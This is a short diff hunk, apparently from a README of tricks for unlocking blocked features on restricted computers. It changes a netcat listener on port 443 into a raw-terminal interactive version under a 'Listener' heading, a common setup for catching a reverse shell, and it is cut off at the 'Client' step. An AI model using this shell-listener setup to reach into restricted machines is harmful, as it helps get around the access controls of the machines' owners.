@@ -24,7 +24,7 @@ Some Regesitry file's to enable Blocked Stuff on Restricted Computers-
 
 Listener-
 ```
-sudo nc -lvnp 443
+sudo stty raw -echo; (stty size; cat) | nc -lvnp 443
 ```
 Client-
 ```
